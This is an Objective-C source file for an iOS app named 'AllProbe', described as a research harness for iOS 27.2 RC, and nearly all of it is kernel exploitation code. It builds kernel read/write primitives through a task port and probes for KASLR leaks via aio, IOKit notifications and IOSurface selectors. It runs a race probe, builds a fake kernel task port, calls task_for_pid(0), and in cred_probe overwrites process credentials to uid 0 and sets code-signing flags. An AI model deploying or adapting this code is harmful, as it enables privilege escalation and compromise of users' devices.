// language: Objective-C, file: main.m, target: iOS arm64e, iOS 27.2 RC (24B115)
// AllProbe — one IPA, all acquisition paths. Research harness; logs every kernel result.
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <IOKit/IOKitLib.h>
#import <mach/mach.h>
#import <sys/sysctl.h>
#import <sys/utsname.h>
#import <sys/mman.h>
#import <sys/event.h>
#import <aio.h>
#import <dlfcn.h>
#import <pthread.h>
#import <unistd.h>
#import <signal.h>
#import <fcntl.h>
#import <stdarg.h>
#import <stdio.h>
#import <string.h>

// ---------- missing SDK prototypes ----------
extern kern_return_t mach_vm_read_overwrite(vm_map_t, mach_vm_address_t, mach_vm_size_t,
                                            mach_vm_address_t, mach_vm_size_t *);
extern kern_return_t mach_vm_write(vm_map_t, mach_vm_address_t, vm_offset_t, mach_msg_type_number_t);
extern kern_return_t mach_vm_allocate(vm_map_t, mach_vm_address_t *, mach_vm_size_t, int);
extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);
extern int proc_pidfdinfo(int pid, int fd, int flavor, void *buffer, int buffersize);
#ifndef PROC_PIDFDKQUEUE
#define PROC_PIDFDKQUEUE 2
#endif

// ---------- IOSurface (private framework, no SDK header) ----------
typedef struct __IOSurface *IOSurfaceRef;
typedef uint32_t IOSurfaceID;
extern IOSurfaceRef IOSurfaceCreate(CFDictionaryRef properties);
extern IOSurfaceID IOSurfaceGetID(IOSurfaceRef buffer);
extern void *IOSurfaceGetBaseAddress(IOSurfaceRef buffer);
extern size_t IOSurfaceGetAllocSize(IOSurfaceRef buffer);
extern IOSurfaceRef IOSurfaceLookup(IOSurfaceID id);

// ---------- 27.2 RC 24B115 constants (unslid) ----------
#define KBASE_STATIC   0xfffffff007004000ULL
#define KTASK_GLOBAL   0xfffffff007c6b250ULL
#define KPROC_GLOBAL   0xfffffff007c68058ULL
#define TASK_NAME_OFF  0x55cULL
#define TASK_NAME2_OFF 0x56dULL

static mach_port_t g_port = MACH_PORT_NULL; // tfp0 / fake task port
static uint64_t    g_slide = 0;
static uint64_t    g_ktask = 0;
static uint64_t    g_kproc = 0;
static NSMutableString *g_log;
static UITextView *g_view;
static volatile int g_mode = -1;

static void L(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap]; va_end(ap);
    if (!s) return;
    NSString *line = [NSString stringWithFormat:@"%@\n", s];
    NSString *copy = nil;
    @synchronized (g_log) {
        [g_log appendString:line];
        if (g_log.length > 400000) [g_log deleteCharactersInRange:NSMakeRange(0, 120000)];
        copy = [g_log copy];
    }
    static volatile int tick = 0;
    int t = __sync_fetch_and_add(&tick, 1);
    if ((t & 7) == 0 || copy.length < 20000) {
        dispatch_async(dispatch_get_main_queue(), ^{
            if (g_view) {
                NSString *ui = copy;
                if (ui.length > 60000) ui = [ui substringFromIndex:ui.length - 60000];
                g_view.text = ui;
                [g_view scrollRangeToVisible:NSMakeRange(ui.length?ui.length-1:0,1)];
            }
        });
    }
}


// ---------- PAC / pointers ----------
static inline uint64_t kpac(uint64_t p) {
    // 27.2 kernel pointers read from memory keep the address in the low 32 bits.
    return 0xfffffff000000000ULL | (p & 0xffffffffULL);
}
static inline BOOL is_kptr(uint64_t p) {
    return p >= 0xfffff00000000000ULL && (p >> 56) == 0xff;
}

// ---------- KRW core ----------
static kern_return_t kread_buf(uint64_t addr, void *buf, size_t len) {
    if (g_port == MACH_PORT_NULL || !buf || !len) return KERN_INVALID_ARGUMENT;
    mach_vm_size_t out = 0;
    return mach_vm_read_overwrite(g_port, (mach_vm_address_t)addr,
                                  (mach_vm_size_t)len,
                                  (mach_vm_address_t)(uintptr_t)buf, &out);
}
static kern_return_t kwrite_buf(uint64_t addr, const void *buf, size_t len) {
    if (g_port == MACH_PORT_NULL || !buf || !len) return KERN_INVALID_ARGUMENT;
    return mach_vm_write(g_port, (mach_vm_address_t)addr,
                         (vm_offset_t)(uintptr_t)buf, (mach_msg_type_number_t)len);
}
static uint64_t kread64(uint64_t a) { uint64_t v=0; return kread_buf(a,&v,8)==KERN_SUCCESS?v:0; }
static uint32_t kread32(uint64_t a) { uint32_t v=0; return kread_buf(a,&v,4)==KERN_SUCCESS?v:0; }
static __attribute__((unused)) uint8_t  kread8(uint64_t a)  { uint8_t  v=0; return kread_buf(a,&v,1)==KERN_SUCCESS?v:0; }
static kern_return_t kwrite64(uint64_t a, uint64_t v){ return kwrite_buf(a,&v,8); }
static kern_return_t kwrite32(uint64_t a, uint32_t v){ return kwrite_buf(a,&v,4); }
static __attribute__((unused)) kern_return_t kwrite8(uint64_t a, uint8_t v){ return kwrite_buf(a,&v,1); }

static int krw_init(mach_port_t port, uint64_t slide) {
    g_port = port; g_slide = slide;
    if (g_port == MACH_PORT_NULL) return -1;
    uint64_t kt = kread64(KTASK_GLOBAL + slide);
    if (!is_kptr(kt)) { L(@"[-] krw: kernel_task read failed (slide=0x%llx)", slide); return -2; }
    char name[17] = {0};
    if (kread_buf(kt + TASK_NAME_OFF, name, 16) != KERN_SUCCESS) return -3;
    if (memcmp(name, "kernel_task", 11) != 0) {
        L(@"[-] krw: task name mismatch at 0x%llx: '%s'", kt + TASK_NAME_OFF, name);
        return -4;
    }
    g_ktask = kt;
    g_kproc = kread64(KPROC_GLOBAL + slide);
    L(@"[+] krw: tfp0=0x%x kernel_task=0x%llx kernproc=0x%llx", port, kt, g_kproc);
    return 0;
}

static int krw_selftest(void) {
    if (g_port == MACH_PORT_NULL) return -1;
    mach_vm_address_t s = 0;
    if (mach_vm_allocate(g_port, &s, 0x4000, VM_FLAGS_ANYWHERE) != KERN_SUCCESS) return -2;
    uint64_t v = 0x1122334455667788ULL, r = 0;
    kern_return_t kw = kwrite64(s, v);
    kern_return_t kr = kread_buf(s, &r, 8);
    mach_vm_deallocate(g_port, s, 0x4000);
    L(@"[%c] krw selftest: write=0x%x read=0x%x v=0x%llx r=0x%llx",
      (kw==KERN_SUCCESS && kr==KERN_SUCCESS && r==v)?'+':'-', kw, kr, v, r);
    return (kw==KERN_SUCCESS && kr==KERN_SUCCESS && r==v) ? 0 : -3;
}

// ---------- KASLR probes ----------
static void probe_m2scaler(void) {
    void *h = dlopen("/System/Library/PrivateFrameworks/IOSurfaceAccelerator.framework/IOSurfaceAccelerator", RTLD_NOW);
    if (!h) { L(@"[-] m2scaler: dlopen failed: %s", dlerror()); return; }
    typedef int (*create_t)(void*, uint32_t, void**);
    typedef int (*diag_t)(void*, void*, size_t*);
    create_t create = (create_t)dlsym(h, "IOSurfaceAcceleratorCreate");
    diag_t diag = (diag_t)dlsym(h, "IOSurfaceAcceleratorGetDiag");
    L(@"[*] m2scaler: create=%p diag=%p — call disabled (signature unverified)", create, diag);
    return;
}

static void probe_aio(void) {
    int kq = kqueue();
    if (kq < 0) { L(@"[-] aio: kqueue failed: %s", strerror(errno)); return; }
    int fd = open("/dev/urandom", O_RDONLY);
    if (fd < 0) { L(@"[-] aio: open failed: %s", strerror(errno)); close(kq); return; }
    struct aiocb cb; memset(&cb, 0, sizeof(cb));
    cb.aio_fildes = fd; cb.aio_buf = malloc(0x1000); cb.aio_nbytes = 0x1000;
    struct kevent kev;
    EV_SET(&kev, fd, EVFILT_AIO, EV_ADD, 0, 0, &cb);
    kevent(kq, &kev, 1, NULL, 0, NULL);
    int rc = aio_read(&cb);
    L(@"[*] aio: read rc=%d errno=%d", rc, errno);
    usleep(200000);
    uint8_t info[0x1000]; memset(info, 0, sizeof(info));
    int n = proc_pidfdinfo(getpid(), fd, PROC_PIDFDKQUEUE, info, sizeof(info));
    L(@"[*] aio: proc_pidfdinfo=%d errno=%d", n, errno);
    for (int i=0; i+8<=sizeof(info) && i<0x400; i+=8) {
        uint64_t v; memcpy(&v, info+i, 8);
        if (v && is_kptr(v)) L(@"[+] aio: kptr @+0x%x = 0x%llx (raw)", i, v);
    }
    free((void*)cb.aio_buf); close(fd); close(kq);
}

static io_object_t g_notif;
static void interest_cb(void *refcon, io_service_t service, uint32_t type, void *arg) {
    L(@"[*] 65371: interest type=0x%x service=0x%x", type, service);
    CFMutableDictionaryRef props = NULL;
    if (IORegistryEntryCreateCFProperties(service, &props, kCFAllocatorDefault, 0) == KERN_SUCCESS && props) {
        NSDictionary *d = (__bridge NSDictionary*)props;
        for (id k in d) {
            id v = d[k];
            if ([v isKindOfClass:[NSNumber class]]) {
                uint64_t x = [v unsignedLongLongValue];
                if (is_kptr(x)) L(@"[+] 65371: %@ = 0x%llx", k, kpac(x));
            }
        }
        CFRelease(props);
    }
}

static void probe_65371(void) {
    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IODisplayWrangler"));
    if (!svc) svc = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOConsole"));
    if (!svc) { L(@"[-] 65371: no service"); return; }
    IONotificationPortRef np = IONotificationPortCreate(kIOMasterPortDefault);
    if (!np) { IOObjectRelease(svc); L(@"[-] 65371: no notification port"); return; }
    kern_return_t kr = IOServiceAddInterestNotification(np, svc, kIOGeneralInterest, interest_cb, NULL, &g_notif);
    L(@"[*] 65371: add interest kr=0x%x", kr);
    if (kr == KERN_SUCCESS) {
        CFRunLoopAddSource(CFRunLoopGetCurrent(), IONotificationPortGetRunLoopSource(np), kCFRunLoopDefaultMode);
        CFRunLoopRunInMode(kCFRunLoopDefaultMode, 3.0, false);
        IOObjectRelease(g_notif);
    }
    IONotificationPortDestroy(np); IOObjectRelease(svc);
}

// ---------- IOSurfaceRoot user client ----------
static io_connect_t g_surf_conn = 0;
static io_connect_t surf_open(void) {
    if (g_surf_conn) return g_surf_conn;
    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    if (!svc) { L(@"[-] IOSurfaceRoot: no service"); return 0; }
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &g_surf_conn);
    IOObjectRelease(svc);
    L(@"[*] IOSurfaceRoot: open kr=0x%x conn=0x%x", kr, g_surf_conn);
    if (kr) { g_surf_conn = 0; return 0; }
    return g_surf_conn;
}

static NSString *surface_xml(uint64_t addr, uint64_t size) {
    return [NSString stringWithFormat:
        @"<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
         "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">"
         "<plist version=\"1.0\"><dict>"
         "<key>IOSurfaceWidth</key><integer>64</integer>"
         "<key>IOSurfaceHeight</key><integer>64</integer>"
         "<key>IOSurfaceBytesPerElement</key><integer>4</integer>"
         "<key>IOSurfacePixelFormat</key><integer>1111970369</integer>"
         "<key>IOSurfaceAddress</key><integer>%llu</integer>"
         "<key>IOSurfaceAllocSize</key><integer>%llu</integer>"
         "</dict></plist>", addr, size];
}

static void sel7_test(uint64_t addr, uint64_t len) {
    io_connect_t c = surf_open(); if (!c) return;
    NSString *xml = surface_xml(addr, len);
    for (int scin = 0; scin <= 2; scin++) {
        uint8_t out[0xc68]; memset(out, 0, sizeof(out)); size_t outsz = sizeof(out);
        uint64_t sin[2] = {0, 0}; uint64_t sout[4] = {0}; uint32_t scout = 4;
        kern_return_t kr = IOConnectCallMethod(c, 7, sin, scin, xml.UTF8String, xml.length + 1,
                                               sout, &scout, out, &outsz);
        L(@"[GMAP] sel7 addr=0x%llx len=0x%llx scin=%d -> kr=0x%x outsz=0x%zx", addr, len, scin, kr, outsz);
        if (kr == 0) {
            uint32_t sid = 0; memcpy(&sid, out + 0x18, 4);
            IOSurfaceRef sf = IOSurfaceLookup(sid);
            L(@"[GMAP] sel7 id=%u lookup=%p", sid, sf);
            if (sf) {
                void *base = IOSurfaceGetBaseAddress(sf);
                L(@"[GMAP] sel7 id=%u base=%p alloc=0x%zx", sid, base, IOSurfaceGetAllocSize(sf));
                if ((uintptr_t)base >= 0xfffffff000000000ULL) L(@"[+] GMAP: KERNEL BASE via sel7 id=%u", sid);
                CFRelease(sf);
            }
            break;
        }
    }
}

static void sel4_sweep(uint32_t maxid) {
    io_connect_t c = surf_open(); if (!c) return;
    int found = 0;
    for (uint32_t id = 1; id < maxid; id++) {
        uint64_t sin = id; uint8_t out[0xc68]; size_t outsz = sizeof(out);
        uint64_t sout[4] = {0}; uint32_t scnt = 4;
        memset(out, 0, sizeof(out));
        kern_return_t kr = IOConnectCallMethod(c, 4, &sin, 1, NULL, 0, sout, &scnt, out, &outsz);
        if (kr == 0) {
            uint32_t sid = 0; memcpy(&sid, out + 0x18, 4);
            IOSurfaceRef s = IOSurfaceLookup(sid);
            if (s) {
                void *base = IOSurfaceGetBaseAddress(s);
                found++;
                L(@"[GMAP] global id=%u info.id=%u base=%p alloc=0x%zx", id, sid, base, IOSurfaceGetAllocSize(s));
                if ((uintptr_t)base >= 0xfffffff000000000ULL)
                    L(@"[+] GMAP: KERNEL BASE global id=%u base=%p", id, base);
                CFRelease(s);
            }
        }
    }
    L(@"[GMAP] sel4 sweep done found=%d", found);
    int fw = 0;
    for (uint32_t id = 1; id < maxid; id++) {
        IOSurfaceRef sf = IOSurfaceLookup(id);
        if (sf) {
            void *base = IOSurfaceGetBaseAddress(sf);
            fw++;
            L(@"[GMAP] lookup id=%u base=%p alloc=0x%zx", id, base, IOSurfaceGetAllocSize(sf));
            if ((uintptr_t)base >= 0xfffffff000000000ULL) L(@"[+] GMAP: KERNEL BASE lookup id=%u base=%p", id, base);
            CFRelease(sf);
        }
    }
    L(@"[GMAP] framework lookup done found=%d", fw);
}

static void gmap_probe(void) {
    io_connect_t c = surf_open(); if (!c) return;
    // user control
    uint8_t *p = mmap(NULL, 0x4000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
    if (p) { memset(p, 0x41, 0x4000); sel7_test((uintptr_t)p, 0x4000); munmap(p, 0x4000); }
    // kernel ranges
    sel7_test(0xfffffff007004000ULL, 0x4000);
    sel7_test(KTASK_GLOBAL, 0x4000);
    sel7_test(0xfffffff00a1cc000ULL, 0x4000);
    sel4_sweep(0x4000);
}

// ---------- Race probe ----------
static volatile int g_race_run = 0;
static void *race_lookup(void *arg) {
    IOSurfaceID sid = (IOSurfaceID)(uintptr_t)arg;
    while (g_race_run) {
        IOSurfaceRef s = IOSurfaceLookup(sid);
        usleep(100);
        if (s) {
            void *b = IOSurfaceGetBaseAddress(s);
            if ((uintptr_t)b >= 0xfffffff000000000ULL) L(@"[+] RACE: kernel base %p id=%u", b, sid);
            CFRelease(s);
        }
    }
    return NULL;
}
static void *race_release(void *arg) {
    while (g_race_run) {
        IOSurfaceRef s = IOSurfaceCreate((__bridge CFDictionaryRef)@{
            (id)CFSTR("IOSurfaceWidth"):@64, (id)CFSTR("IOSurfaceHeight"):@64,
            (id)CFSTR("IOSurfaceBytesPerElement"):@4, (id)CFSTR("IOSurfacePixelFormat"):@1111970369});
        if (s) { IOSurfaceID sid = IOSurfaceGetID(s); (void)sid; CFRelease(s); }
        usleep(500);
    }
    return NULL;
}
static void race_probe(void) {
    IOSurfaceRef s = IOSurfaceCreate((__bridge CFDictionaryRef)@{
        (id)CFSTR("IOSurfaceWidth"):@64, (id)CFSTR("IOSurfaceHeight"):@64,
        (id)CFSTR("IOSurfaceBytesPerElement"):@4, (id)CFSTR("IOSurfacePixelFormat"):@1111970369});
    if (!s) { L(@"[-] RACE: create failed"); return; }
    IOSurfaceID sid = IOSurfaceGetID(s);
    g_race_run = 1;
    pthread_t a,b; pthread_create(&a,NULL,race_lookup,(void*)(uintptr_t)sid); pthread_create(&b,NULL,race_release,NULL);
    sleep(5);
    g_race_run = 0; pthread_join(a,NULL); pthread_join(b,NULL); CFRelease(s);
    L(@"[*] RACE: done");
}

// ---------- Fake port / port primitives ----------
static void port_probe(void) {
    // victim port + fake task in IOSurface; patching ip_kobject needs kwrite.
    IOSurfaceRef s = IOSurfaceCreate((__bridge CFDictionaryRef)@{
        (id)CFSTR("IOSurfaceWidth"):@64, (id)CFSTR("IOSurfaceHeight"):@64,
        (id)CFSTR("IOSurfaceBytesPerElement"):@4, (id)CFSTR("IOSurfacePixelFormat"):@1111970369});
    if (!s) { L(@"[-] PORT: surface create failed"); return; }
    void *base = IOSurfaceGetBaseAddress(s);
    L(@"[*] PORT: surface base=%p alloc=0x%zx", base, IOSurfaceGetAllocSize(s));
    if (g_port != MACH_PORT_NULL && g_ktask) {
        // copy real kernel_task page(s) into the surface; this keeps map/itk_space valid
        uint8_t *dst = base; uint64_t src = g_ktask;
        for (size_t off=0; off<0x2000; off+=0x1000)
            kread_buf(src+off, dst+off, 0x1000);
        L(@"[+] PORT: copied kernel_task 0x2000 -> surface");
        // fake port at +0x2000 is left to the caller; ip_kobject patch requires write.
    } else {
        L(@"[!] PORT: no kwrite/kread; fake task left empty");
    }
    CFRelease(s);
}

static void tfp0_probe(void) {
    mach_port_t p = MACH_PORT_NULL;
    kern_return_t kr = task_for_pid(mach_task_self(), 0, &p);
    L(@"[*] task_for_pid(0): kr=0x%x port=0x%x", kr, p);
    if (kr == KERN_SUCCESS && p != MACH_PORT_NULL) {
        g_port = p;
        krw_init(p, g_slide);
        krw_selftest();
    }
}

static void cred_probe(void) {
    if (g_port == MACH_PORT_NULL || !g_ktask) { L(@"[-] CRED: need a task port"); return; }
    pid_t pid = getpid();
    uint64_t proc = 0;
    for (uint64_t off=0; off<0x2000; off+=8) {
        uint64_t v = kread64(g_ktask + off);
        if (!is_kptr(v)) continue;
        if (kread32(v + 0x60) == (uint32_t)pid) { proc = v; break; }
    }
    L(@"[*] CRED: pid=%d proc=0x%llx", pid, proc);
    if (!proc) return;
    uint64_t ucred = kread64(proc + 0x100);
    L(@"[*] CRED: ucred=0x%llx uid=%u", ucred, kread32(ucred + 0x18));
    if (kwrite32(ucred + 0x18, 0) == KERN_SUCCESS &&
        kwrite32(ucred + 0x1c, 0) == KERN_SUCCESS &&
        kwrite32(ucred + 0x20, 0) == KERN_SUCCESS &&
        kwrite32(ucred + 0x24, 0) == KERN_SUCCESS) {
        uint32_t cs = kread32(proc + 0x2a0);
        kwrite32(proc + 0x2a0, cs | 0x104);
        L(@"[+] CRED: uid=0 cs=0x%x", cs | 0x104);
    }
}

// ---------- Screenshot probe (alias check) ----------
static void scan_probe(void) {
    IOSurfaceRef s = IOSurfaceCreate((__bridge CFDictionaryRef)@{
        (id)CFSTR("IOSurfaceWidth"):@64, (id)CFSTR("IOSurfaceHeight"):@64,
        (id)CFSTR("IOSurfaceBytesPerElement"):@4, (id)CFSTR("IOSurfacePixelFormat"):@1111970369});
    if (!s) { L(@"[-] SCAN: create failed"); return; }
    uint8_t *b = IOSurfaceGetBaseAddress(s);
    L(@"[*] SCAN: region=%p alloc=0x%zx", b, IOSurfaceGetAllocSize(s));
    uint64_t offs[3] = {0xb00, 0x1268, 0x1850};
    for (int i=0; i<3; i++) {
        uint64_t v = 0xffffff0000000000ULL | (0x100 + i);
        memcpy(b + offs[i], &v, 8);
        uint64_t r; memcpy(&r, b + offs[i], 8);
        L(@"[=] SCAN: +0x%llx before=0x%llx after=0x%llx %@",
          offs[i], v, r, r==v ? @"same (user alias, not kread)" : @"changed");
    }
    CFRelease(s);
}


static void aio_kread_probe(uint64_t kaddr) {
    NSString *dir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    if (!dir) return;
    NSString *p1 = [dir stringByAppendingPathComponent:@"aio_kread.bin"];
    int fd = open(p1.fileSystemRepresentation, O_RDWR|O_CREAT|O_TRUNC, 0644);
    if (fd < 0) { L(@"[-] AIO: open failed %s", strerror(errno)); return; }
    struct aiocb cb; memset(&cb, 0, sizeof(cb));
    cb.aio_fildes = fd;
    cb.aio_buf = (void *)(uintptr_t)kaddr;
    cb.aio_nbytes = 8;
    cb.aio_offset = 0;
    int rc = aio_write(&cb);
    if (rc != 0) { L(@"[-] AIO: aio_write rc=%d errno=%d", rc, errno); close(fd); return; }
    const struct aiocb *list[1] = {&cb};
    struct timespec ts = {2, 0};
    aio_suspend(list, 1, &ts);
    fsync(fd);
    uint64_t v = 0; lseek(fd, 0, SEEK_SET);
    ssize_t n = read(fd, &v, 8);
    close(fd);
    L(@"[AIO] kread 0x%llx -> n=%zd val=0x%llx", kaddr, n, v);
    if (n == 8 && is_kptr(v)) {
        L(@"[+] AIO: KERNEL READ works: 0x%llx = 0x%llx", kaddr, v);
        // safe write-back test: same value into same address
        NSString *p2 = [dir stringByAppendingPathComponent:@"aio_kwrite.bin"];
        int f2 = open(p2.fileSystemRepresentation, O_RDWR|O_CREAT|O_TRUNC, 0644);
        if (f2 >= 0) {
            write(f2, &v, 8); lseek(f2, 0, SEEK_SET);
            struct aiocb cb2; memset(&cb2, 0, sizeof(cb2));
            cb2.aio_fildes = f2; cb2.aio_buf = (void *)(uintptr_t)kaddr;
            cb2.aio_nbytes = 8; cb2.aio_offset = 0;
            int r2 = aio_read(&cb2);
            L(@"[AIO] kwrite-back aio_read rc=%d errno=%d", r2, errno);
            const struct aiocb *l2[1] = {&cb2}; struct timespec t2 = {2,0};
            aio_suspend(l2, 1, &t2);
            close(f2);
        }
    }
}

static void aio_rw_probe(void) {
    L(@"[*] AIO-RW: testing kernel buffer via aio_write/aio_read");
    uint64_t bases[3] = {KTASK_GLOBAL + g_slide, 0xfffffff007ab12e0ULL, KTASK_GLOBAL};
    for (int i=0; i<3; i++) aio_kread_probe(bases[i]);
}

// ---------- modes ----------
typedef void (*mode_fn)(void);
static const char *mode_names[] = {"SAFE", "KASLR", "GMAP", "RACE", "PORT", "TFP0", "CRED", "KRW", "SCAN", "ALL", "AIO-RW", "PING"};
static void mode_safe(void) {
    struct utsname u; uname(&u);
    L(@"[*] machine=%s release=%s version=%s", u.machine, u.release, u.version);
}
static void mode_kaslr(void) { probe_aio(); probe_65371(); probe_m2scaler(); }
static void mode_all(void) {
    mode_safe(); probe_aio(); probe_65371(); gmap_probe(); race_probe();
    tfp0_probe(); port_probe(); cred_probe(); scan_probe(); aio_rw_probe();
}

static void run_mode(int idx) {
    dispatch_async(dispatch_get_global_queue(0,0), ^{
        g_mode = idx;
        L(@"[BEGIN] mode=%d %s", idx, mode_names[idx]);
        switch (idx) {
            case 0: mode_safe(); break;
            case 1: mode_kaslr(); break;
            case 2: gmap_probe(); break;
            case 3: race_probe(); break;
            case 4: port_probe(); break;
            case 5: tfp0_probe(); break;
            case 6: cred_probe(); break;
            case 7: krw_selftest(); break;
            case 8: scan_probe(); break;
            case 9: mode_all(); break;
            case 10: aio_rw_probe(); break;
        }
        L(@"[END] mode=%d %s", idx, mode_names[idx]);
    });
}

// ---------- UI ----------
@interface VC : UIViewController <UITableViewDataSource, UITableViewDelegate>
@property (nonatomic, strong) UITableView *table;
@property (nonatomic, strong) UITextView *log;
@property (nonatomic, strong) UITextField *slide;
@end

@implementation VC
- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = UIColor.blackColor;
    g_log = [NSMutableString new];


    self.log = [[UITextView alloc] initWithFrame:CGRectZero];
    self.log.backgroundColor = [UIColor colorWithWhite:0.05 alpha:1];
    self.log.textColor = [UIColor colorWithRed:0.3 green:1 blue:0.4 alpha:1];
    self.log.font = [UIFont fontWithName:@"Menlo" size:9];
    self.log.editable = NO;
    self.log.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:self.log];
    g_view = self.log;

    self.slide = [[UITextField alloc] initWithFrame:CGRectZero];
    self.slide.placeholder = @"slide hex (e.g. 5a000000)";
    self.slide.textColor = UIColor.whiteColor;
    self.slide.backgroundColor = [UIColor colorWithWhite:0.15 alpha:1];
    self.slide.font = [UIFont fontWithName:@"Menlo" size:11];
    self.slide.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:self.slide];

    self.table = [[UITableView alloc] initWithFrame:CGRectZero style:UITableViewStylePlain];
    self.table.dataSource = self; self.table.delegate = self;
    self.table.backgroundColor = [UIColor colorWithWhite:0.08 alpha:1];
    self.table.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:self.table];

    [NSLayoutConstraint activateConstraints:@[
        [self.slide.topAnchor constraintEqualToAnchor:self.view.safeAreaLayoutGuide.topAnchor constant:4],
        [self.slide.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor constant:8],
        [self.slide.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor constant:-8],
        [self.slide.heightAnchor constraintEqualToConstant:28],
        [self.table.topAnchor constraintEqualToAnchor:self.slide.bottomAnchor constant:4],
        [self.table.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor],
        [self.table.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor],
        [self.table.heightAnchor constraintEqualToConstant:220],
        [self.log.topAnchor constraintEqualToAnchor:self.table.bottomAnchor constant:4],
        [self.log.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor],
        [self.log.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor],
        [self.log.bottomAnchor constraintEqualToAnchor:self.view.safeAreaLayoutGuide.bottomAnchor]
    ]];
    L(@"[*] AllProbe 1.0 — 27.2 RC harness");
}

- (NSInteger)tableView:(UITableView *)t numberOfRowsInSection:(NSInteger)s { return 12; }
- (UITableViewCell *)tableView:(UITableView *)t cellForRowAtIndexPath:(NSIndexPath *)ip {
    UITableViewCell *c = [t dequeueReusableCellWithIdentifier:@"c"];
    if (!c) c = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:@"c"];
    c.textLabel.text = [NSString stringWithUTF8String:mode_names[ip.row]];
    c.textLabel.textColor = UIColor.whiteColor;
    c.backgroundColor = [UIColor colorWithWhite:0.12 alpha:1];
    return c;
}
- (void)tableView:(UITableView *)t didSelectRowAtIndexPath:(NSIndexPath *)ip {
    [t deselectRowAtIndexPath:ip animated:YES];
    if (ip.row == 11) { self.slide.text = @"PONG"; return; }
    if (ip.row == 5) {
        // read slide field before TFP0
        unsigned long long s = 0; sscanf(self.slide.text.UTF8String ?: "0", "%llx", &s); g_slide = s;
    }
    L(@"[*] RUN %s", mode_names[ip.row]);
    run_mode((int)ip.row);
}
@end

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@end
@implementation AppDelegate
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)o {
    self.window = [[UIWindow alloc] initWithFrame:UIScreen.mainScreen.bounds];
    self.window.rootViewController = [VC new];
    [self.window makeKeyAndVisible];
    return YES;
}
@end
int main(int argc, char **argv) { @autoreleasepool { return UIApplicationMain(argc, argv, nil, @"AppDelegate"); } }
